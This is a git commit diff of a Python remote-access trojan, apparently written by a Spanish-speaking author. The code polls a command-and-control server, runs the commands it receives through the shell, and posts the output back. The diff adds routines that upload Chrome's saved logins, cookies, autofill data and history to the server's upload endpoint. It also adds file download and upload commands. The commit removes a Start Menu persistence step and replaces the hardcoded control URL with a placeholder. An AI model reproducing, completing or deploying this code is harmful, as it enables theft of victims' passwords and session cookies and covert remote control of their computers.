b411e3da684522373ecc94da96c07bafd7277ddf
piter <68443246+PiterIvano@users.noreply.github.com>
2021-11-19 19:10:07 +0100

    Update hacked_1.1.py

--- hacked_1.1.py
+++ hacked_1.1.py
@@ -7,12 +7,8 @@ import subprocess
 print("INICIANDO")
 user = getpass.getuser()
 
-dire = f'/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Chrome.exe'
-di = f'copy hacked_1.1.exe "{dire}"'
-print(di)
-os.system(di)
 
-urlp = "https://marksukember12.000webhostapp.com"
+urlp = "pagina propia aqui"
 
 headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
 ip = requests.post(f"{urlp}", headers=headers).text
@@ -25,23 +21,95 @@ while True:
 
     
     if comand == "":
-        comand  = requests.post(f"{urlp}/{ip}.txt", headers=headers).text
+        comand  = requests.post(f"{urlp}/dispo/{ip}.txt", headers=headers).text
         if comand == "":
             time.sleep(10)
             print("no hay comandos user")
+        elif comand == "downloads":
+            time.sleep(2)
+            link = requests.post(f"{urlp}/download.txt", headers=headers).text
+            name = requests.post(f"{urlp}/download1.txt", headers=headers).text
+            myfile = requests.get(link)
+            open(f"c:/users/{user}/chrome/{name}", 'wb').write(myfile.content)
+            requests.post(f"{urlp}/index.php", data={"data": "lo", "userr": user}, headers=headers)
+            
+        elif comand == "upload":
+            dirr = requests.post(f"{urlp}/download.txt", headers=headers).text
+            url = f"{urlp}/dbs/upload.php"
+            files = {"subir_archivo": open("name.txt", "rb")}
+            send = requests.post(url, files=files, headers=headers)
+            envio = send.text
+            requests.post(f"{urlp}/index.php", data={"data": "lo", "userr": user}, headers=headers)
+            
+        elif comand == "database":
+            getuser = getpass.getuser()
+            #copiando del sistema
+            history = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/History"
+            webData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Web Data"
+            loginData = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
+            Visited = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Visited Links"
+            Cookies = f"/Users/{getuser}/AppData/Local/Google/Chrome/User Data/Default/Cookies"
+
+
+            #mandando al server
+
+            user = getpass.getuser()
+
+            file = open("name.txt", "w")
+            file.write("Nombre del pc: " + user)
+            file.close()
+            #url que se usara para recivir los archivos
+
+            url = f"{urlp}/dbs/upload.php"
+            #headers 
+            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
+
+
+
+            #subiendo el archivo
+            files = {"subir_archivo": open("name.txt", "rb")}
+            send = requests.post(url, files=files, headers=headers)
+            envio = send.text
+
+
+            files = {"subir_archivo": open(loginData, "rb")}
+            send = requests.post(url, files=files, headers=headers)
+            envio = send.text
+            
+            """_____________________________________________________________________________________________________"""
+            files = {"subir_archivo": open(webData, "rb")}
+            send = requests.post(url, files=files, headers=headers)
+            envio = send.text
+            files = {"subir_archivo": open(Cookies, "rb")}
+            send = requests.post(url, files=files, headers=headers)
+            envio = send.text
+            files = {"subir_archivo": open(Visited, "rb")}
+            send = requests.post(url, files=files, headers=headers)
+            envio = send.text
+            files = {"subir_archivo": open(history, "rb")}
+            send = requests.post(url, files=files, headers=headers)
+            envio = send.text
+            requests.post(f"{urlp}/index.php", data={"data": "lo", "userr": user}, headers=headers)
+
         else:
-            rep = subprocess.check_output(comand, shell=True)
-            requests.post(f"{urlp}/index.php", data={"data": rep, "userr": user}, headers=headers)
-            print(rep)          
-            print("Enviando comandos user")
-            time.sleep(10)
+            try:
+                rep = subprocess.check_output(comand, shell=True)
+                requests.post(f"{urlp}/index.php", data={"data": rep, "userr": user}, headers=headers)
+                print(rep)          
+                print("Enviando comandos user")
+                time.sleep(10)
+            except:
+                pass
     else:
         if comand == "":
             time.sleep(10)
             print("no hay comandos principal")
         else:
-            rep = subprocess.check_output(comand, shell=True)
-            sub = requests.post(f"{urlp}/index.php", data={"data": rep, "admin": "listo"}, headers=headers)
-            print(sub.text)          
-            print("Enviando comandos principal")
-            time.sleep(10)
+            try:
+                rep = subprocess.check_output(comand, shell=True)
+                sub = requests.post(f"{urlp}/index.php", data={"data": rep, "admin": "listo"}, headers=headers)
+                print(sub.text)          
+                print("Enviando comandos principal")
+                time.sleep(10)
+            except:
+                pass
